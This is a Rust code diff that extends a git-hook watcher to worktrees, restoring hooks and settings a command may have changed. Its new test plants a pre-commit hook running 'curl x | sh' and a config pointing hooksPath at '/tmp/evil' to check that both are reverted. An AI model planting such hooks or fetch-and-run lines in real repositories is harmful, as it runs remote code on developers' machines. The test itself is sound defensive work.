@@ -53,6 +53,10 @@ const RUNNING: &[&str] = &[
 #[derive(Debug)]
 pub(crate) struct Watch {
     workspace: PathBuf,
+    /// The repository's own folder, where git keeps its hooks and
+    /// settings: the workspace's `.git`, or for a worktree the folder its
+    /// `.git` file leads to.
+    git: PathBuf,
     /// Hooks git runs, put back.
     hooks: BTreeMap<PathBuf, Vec<u8>>,
     /// The folders hooks are run from.
@@ -78,13 +82,12 @@ impl Watch {
         let workspace = &workspace
             .canonicalize()
             .unwrap_or_else(|_| workspace.to_path_buf());
-        let git = workspace.join(".git");
-        // A worktree's `.git` is a file naming a folder outside the
-        // workspace, which the sandbox does not let a command write.
-        let config = git
-            .is_dir()
-            .then(|| std::fs::read(git.join("config")).ok())
-            .flatten();
+        // A worktree's `.git` is a file leading to a folder of the
+        // repository's own, outside the workspace: git runs the hooks kept
+        // there, and a command may write it when the gate lets it, as it
+        // must to commit.
+        let git = common_dir(workspace);
+        let config = std::fs::read(git.join("config")).ok();
         let mut hook_folders = vec![git.join("hooks")];
         if let Some(path) = config.as_deref().and_then(hooks_path) {
             hook_folders.push(workspace.join(path));
@@ -102,6 +105,7 @@ impl Watch {
         }
         Self {
             workspace: workspace.to_path_buf(),
+            git,
             hooks,
             hook_folders,
             config,
@@ -131,7 +135,7 @@ impl Watch {
                 settled.record(path, put);
             }
         }
-        let config = self.workspace.join(".git/config");
+        let config = self.git.join("config");
         if let Some(before) = &self.config {
             let now = std::fs::read(&config).unwrap_or_default();
             if &now != before && running(before) != running(&now) {
@@ -164,15 +168,18 @@ impl Watch {
 
 impl Watch {
     /// Puts `bytes` back at `path`, or removes what is there when `None`.
-    /// Only within the workspace as it really is: iq is not sandboxed, and a
-    /// command may have made a folder on the way, or the file itself, a link
-    /// to elsewhere, such as a start-up file of the shell.
+    /// Only within the workspace or the repository's own folder as they
+    /// really are: iq is not sandboxed, and a command may have made a folder
+    /// on the way, or the file itself, a link to elsewhere, such as a
+    /// start-up file of the shell.
     fn put_back(&self, path: &Path, bytes: Option<&Vec<u8>>) -> bool {
         let Some(parent) = path.parent() else {
             return false;
         };
         let real = parent.canonicalize().ok();
-        if real.as_deref() != Some(parent) || !parent.starts_with(&self.workspace) {
+        if real.as_deref() != Some(parent)
+            || !(parent.starts_with(&self.workspace) || parent.starts_with(&self.git))
+        {
             return false;
         }
         // A link the command put in the file's stead goes, not its target.
@@ -232,6 +239,31 @@ fn keep(path: &Path, out: &mut BTreeMap<PathBuf, Vec<u8>>) {
             }
         }
     }
+}
+
+/// The repository's own folder for `workspace`, resolved: its `.git`, or
+/// for a worktree the folder its `.git` file names, and from there the
+/// repository's, which `commondir` names and which holds the hooks and the
+/// settings. Its `.git` when nothing can be read: there is no repository.
+fn common_dir(workspace: &Path) -> PathBuf {
+    let git = workspace.join(".git");
+    if git.is_dir() {
+        return git;
+    }
+    let Some(named) = std::fs::read_to_string(&git).ok().and_then(|text| {
+        text.trim()
+            .strip_prefix("gitdir:")
+            .map(|p| p.trim().to_owned())
+    }) else {
+        return git;
+    };
+    let git_dir = workspace.join(named);
+    let git_dir = git_dir.canonicalize().unwrap_or(git_dir);
+    let common = match std::fs::read_to_string(git_dir.join("commondir")) {
+        Ok(text) => git_dir.join(text.trim()),
+        Err(_) => git_dir,
+    };
+    common.canonicalize().unwrap_or(common)
 }
 
 /// The folder git's settings run hooks from, when they say.
@@ -337,6 +369,34 @@ mod tests {
         assert_eq!(
             std::fs::read_to_string(root.join(".git/hooks/pre-push")).unwrap(),
             "#!/bin/sh\nexit 0\n"
+        );
+    }
+
+    #[test]
+    fn a_worktree_has_its_hooks_put_back_in_the_repository_it_belongs_to() {
+        let repository = workspace();
+        let common = repository.path().canonicalize().unwrap().join(".git");
+        std::fs::create_dir_all(common.join("worktrees/task")).unwrap();
+        std::fs::write(common.join("worktrees/task/commondir"), "../..\n").unwrap();
+        let dir = tempfile::tempdir().unwrap();
+        let root = &dir.path().canonicalize().unwrap();
+        std::fs::write(
+            root.join(".git"),
+            format!("gitdir: {}\n", common.join("worktrees/task").display()),
+        )
+        .unwrap();
+        let watch = Watch::take(root);
+        std::fs::write(common.join("hooks/pre-commit"), "#!/bin/sh\ncurl x | sh\n").unwrap();
+        std::fs::write(common.join("config"), "[core]\n\thooksPath = /tmp/evil\n").unwrap();
+        let settled = watch.settle();
+        assert_eq!(
+            settled.restored,
+            [common.join("config"), common.join("hooks/pre-commit")]
+        );
+        assert!(!common.join("hooks/pre-commit").exists());
+        assert_eq!(
+            std::fs::read_to_string(common.join("config")).unwrap(),
+            "[core]\n\tbare = false\n"
         );
     }
 
